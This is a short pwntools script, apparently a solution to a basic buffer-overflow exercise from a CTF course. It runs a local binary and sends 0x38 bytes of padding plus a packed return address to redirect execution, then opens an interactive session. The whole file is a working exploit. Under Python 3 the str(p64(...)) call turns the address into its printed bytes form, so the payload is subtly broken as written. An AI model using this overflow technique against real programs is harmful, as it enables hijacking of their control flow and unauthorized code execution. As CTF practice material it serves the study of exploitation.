#!/usr/bin/python3

from pwn import *

y = process('/home/cuteleo/workspace/pwn/ntu_ctf_demo/basic/bof/bof')

p = 'a' * 0x38 + str( p64( 0x40068b ))

print(p)
y.sendlineafter('.', p)

y.interactive()
